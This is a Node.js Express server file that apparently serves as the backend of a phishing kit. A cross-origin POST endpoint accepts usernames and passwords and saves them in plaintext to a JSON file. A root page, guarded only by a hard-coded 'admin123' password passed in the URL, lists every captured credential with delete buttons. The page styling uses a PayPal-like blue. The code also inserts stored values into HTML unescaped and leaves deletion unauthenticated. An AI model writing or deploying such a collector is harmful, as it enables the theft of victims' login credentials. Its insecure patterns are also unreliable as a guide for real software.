const express = require('express');
const cors = require('cors');
const bodyParser = require('body-parser');
const fs = require('fs');
const path = require('path');

const app = express();
const PORT = process.env.PORT || 3000; // Use environment PORT for Render
const DATA_FILE = path.join(__dirname, 'records.json');
const PASSWORD = 'admin123'; // Change this to a secure password

// Middleware
app.use(cors());
app.use(bodyParser.json());

// Ensure records file exists
if (!fs.existsSync(DATA_FILE)) {
    fs.writeFileSync(DATA_FILE, JSON.stringify([]));
}

// POST endpoint to collect form data
app.post('/submit', (req, res) => {
    const { username, password } = req.body;
    
    if (!username || !password) {
        return res.status(400).json({ success: false, message: 'Missing fields' });
    }

    const records = JSON.parse(fs.readFileSync(DATA_FILE));
    const newRecord = {
        id: Date.now(),
        username,
        password,
        timestamp: new Date().toISOString()
    };
    
    records.push(newRecord);
    fs.writeFileSync(DATA_FILE, JSON.stringify(records, null, 2));
    
    res.json({ success: true });
});

// GET endpoint to display records at root URL (/)
app.get('/', (req, res) => {
    const authPassword = req.query.password;
    
    if (authPassword !== PASSWORD) {
        return res.send(`
            <!DOCTYPE html>
            <html>
            <head>
                <title>Authentication Required</title>
                <style>
                    body {
                        font-family: 'Segoe UI', Arial, sans-serif;
                        text-align: center;
                        padding: 50px;
                        background: linear-gradient(135deg, #e0e7ff, #ffffff);
                        height: 100vh;
                        display: flex;
                        justify-content: center;
                        align-items: center;
                        margin: 0;
                    }
                    .auth-container {
                        background: white;
                        padding: 30px;
                        border-radius: 10px;
                        box-shadow: 0 4px 20px rgba(0, 0, 0, 0.1);
                        max-width: 400px;
                        width: 100%;
                    }
                    h2 {
                        color: #0070ba;
                        margin-bottom: 20px;
                    }
                    input {
                        padding: 10px;
                        margin: 10px 0;
                        width: 100%;
                        border: 1px solid #0070ba;
                        border-radius: 5px;
                        font-size: 16px;
                    }
                    button {
                        padding: 10px 20px;
                        background: #0070ba;
                        color: white;
                        border: none;
                        border-radius: 5px;
                        font-size: 16px;
                        cursor: pointer;
                        transition: background 0.3s;
                    }
                    button:hover {
                        background: #005ea6;
                    }
                </style>
            </head>
            <body>
                <div class="auth-container">
                    <h2>Enter Password</h2>
                    <input type="password" id="pass" placeholder="Password">
                    <button onclick="window.location.href='/?password='+document.getElementById('pass').value">
                        Submit
                    </button>
                </div>
            </body>
            </html>
        `);
    }

    const records = JSON.parse(fs.readFileSync(DATA_FILE));
    // Sort records by timestamp (latest first)
    records.sort((a, b) => new Date(b.timestamp) - new Date(a.timestamp));
    
    const html = `
        <!DOCTYPE html>
        <html>
        <head>
            <title>Records</title>
            <style>
                * {
                    margin: 0;
                    padding: 0;
                    box-sizing: border-box;
                }
                body {
                    font-family: 'Segoe UI', Arial, sans-serif;
                    background: linear-gradient(135deg, #e0e7ff, #ffffff);
                    min-height: 100vh;
                    padding: 40px 20px;
                }
                .container {
                    max-width: 900px;
                    margin: 0 auto;
                    background: white;
                    border-radius: 15px;
                    box-shadow: 0 8px 30px rgba(0, 0, 0, 0.1);
                    padding: 30px;
                }
                h1 {
                    color: #0070ba;
                    text-align: center;
                    margin-bottom: 40px;
                    font-size: 2.5em;
                    font-weight: 600;
                    text-transform: uppercase;
                    letter-spacing: 1px;
                    text-shadow: 1px 1px 2px rgba(0, 0, 0, 0.1);
                }
                .record {
                    background: #f9f9f9;
                    padding: 20px;
                    margin: 15px 0;
                    border-radius: 10px;
                    box-shadow: 0 4px 15px rgba(0, 0, 0, 0.05);
                    transition: all 0.3s ease;
                    border-left: 5px solid #0070ba;
                    position: relative;
                    display: flex;
                    flex-direction: column;
                    gap: 10px;
                }
                .record:hover {
                    transform: translateY(-5px);
                    box-shadow: 0 6px 20px rgba(0, 0, 0, 0.1);
                    background: #fff;
                }
                .record p {
                    margin: 5px 0;
                    color: #333;
                    font-size: 1.1em;
                }
                .record p strong {
                    color: #0070ba;
                    font-weight: 600;
                }
                .delete-btn {
                    background: linear-gradient(45deg, #ff4444, #ff6666);
                    color: white;
                    border: none;
                    padding: 8px 16px;
                    border-radius: 5px;
                    cursor: pointer;
                    font-size: 0.9em;
                    font-weight: 500;
                    align-self: flex-end;
                    transition: all 0.3s ease;
                }
                .delete-btn:hover {
                    background: linear-gradient(45deg, #cc0000, #ff4444);
                    transform: scale(1.05);
                }
                .timestamp {
                    font-size: 0.9em;
                    color: #666;
                    font-style: italic;
                }
                .no-records {
                    text-align: center;
                    color: #666;
                    font-size: 1.2em;
                    margin-top: 20px;
                    font-style: italic;
                }
            </style>
        </head>
        <body>
            <div class="container">
                <h1>Records</h1>
                ${records.length === 0 ? `
                    <p class="no-records">No records found.</p>
                ` : records.map(record => `
                    <div class="record">
                        <p><strong>ID:</strong> ${record.id}</p>
                        <p><strong>Username:</strong> ${record.username}</p>
                        <p><strong>Password:</strong> ${record.password}</p>
                        <p class="timestamp"><strong>Timestamp:</strong> ${new Date(record.timestamp).toLocaleString()}</p>
                        <button class="delete-btn" onclick="fetch('/delete/${record.id}', {method: 'DELETE'}).then(() => location.reload())">
                            Delete
                        </button>
                    </div>
                `).join('')}
            </div>
        </body>
        </html>
    `;
    
    res.send(html);
});

// DELETE endpoint to remove records
app.delete('/delete/:id', (req, res) => {
    const id = parseInt(req.params.id);
    let records = JSON.parse(fs.readFileSync(DATA_FILE));
    records = records.filter(record => record.id !== id);
    fs.writeFileSync(DATA_FILE, JSON.stringify(records, null, 2));
    res.json({ success: true });
});

app.listen(PORT, () => {
    console.log(`Server running on port ${PORT}`);
});
